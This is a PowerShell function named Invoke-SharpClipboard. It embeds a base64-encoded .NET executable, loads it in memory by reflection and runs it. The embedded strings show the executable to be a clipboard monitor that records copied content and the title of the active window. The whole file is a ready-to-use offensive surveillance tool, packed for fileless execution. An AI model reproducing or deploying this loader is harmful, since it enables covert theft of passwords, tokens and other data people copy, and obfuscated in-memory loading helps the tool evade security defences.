function Invoke-SharpClipboard
{

    $anotherbin="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uQDzA1cA8QCsAF0AmQBWAGIACAAEAHIALgALAKUALgATAK4ALgAbAM0ALgAjANYALgArAOoALgAzAOoALgA7AOoALgBDANYALgBLAPAALgBTAOoALgBbAOoALgBjAAgBLgBrADIBLgBzAD8BowB7AI0BAwB3AD0AwAJAAQMAOwMBAEABBQABBAEARAEHAEMEAQAAAQkArAIBAAABCwBcBAEABIAAAAEAAAAAAAAAAAAAAAAAeQAAAAQAAAAAAAAAAAAAAGkATQAAAAAABAAAAAAAAAAAAAAAaQDeAwAAAAAFAAMABgAEAAAAAAAAPD5jX19EaXNwbGF5Q2xhc3MwXzAAPEdldFRleHQ+Yl9fMAA8TW9kdWxlPgBIV05EX01FU1NBR0UAV01fQ0xJUEJPQVJEVVBEQVRFAG1zY29ybGliAFduZFByb2MAVGhyZWFkAGhXbmRDaGlsZABoV25kAGh3bmQAU2hhcnBDbGlwYm9hcmQATWVzc2FnZQBnZXRfSGFuZGxlAENvbnNvbGUARGF0ZVRpbWUAV3JpdGVMaW5lAFNldEFwYXJ0bWVudFN0YXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFJldHVyblZhbHVlAFNoYXJwQ2xpcGJvYXJkLmV4ZQBTeXN0ZW0uVGhyZWFkaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAVG9TdHJpbmcAbHBTdHJpbmcAZ2V0X01zZwBHZXRXaW5kb3dUZXh0TGVuZ3RoAHVzZXIzMi5kbGwAQ29udHJvbABTeXN0ZW0ATm90aWZpY2F0aW9uRm9ybQBNYWluAEpvaW4AQ2xpcGJvYXJkTm90aWZpY2F0aW9uAEFwcGxpY2F0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFJ1bgBTdHJpbmdCdWlsZGVyAEFkZENsaXBib2FyZEZvcm1hdExpc3RlbmVyAC5jdG9yAC5jY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAE5hdGl2ZU1ldGhvZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYXJncwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBDb25jYXQAT2JqZWN0AFNldFBhcmVudABoV25kTmV3UGFyZW50AG5NYXhDb3VudABUaHJlYWRTdGFydABTeXN0ZW0uVGV4dABHZXRUZXh0AEdldFdpbmRvd1RleHQAZ2V0X1V0Y05vdwBHZXRGb3JlZ3JvdW5kV2luZG93AGdldF9DYXBhY2l0eQBFbXB0eQAAAENDAG8AcAB5ACAAZQB2AGUAbgB0ACAAZABlAHQAZQBjAHQAZQBkACAAYQB0ACAAewAwAH0AIAAoAFUAVABDACkAIQAAM0MAbABpAHAAYgBvAGEAcgBkACAAQQBjAHQAaQB2AGUAIABXAGkAbgBkAG8AdwA6ACAAACdDAGwAaQBwAGIAbwBhAHIAZAAgAEMAbwBuAHQAZQBuAHQAOgAgAAAAAACOQ2S86bVUSZw/w9WIE40PAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQICBg4FIAIBHBgFIAEBEmEFIAEBEWkFAAEBEk0DAAAOAyAAGAYHAhFVEkUDIAAIBAAAEVUFAAIBDhwDIAAOBQACDg4OBAABAQ4GIAEBEBFRCLd6XFYZNOCJBB0DAAABAgIGCAIGGAQAAQIYBQACGBgYBwADCBgSRQgEAAEIGAMAABgDAAABBQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABMBAA5TaGFycENsaXBi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"
    $ASD = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($anotherbin))
    [ClipboardNotification]::Main("")
  
}
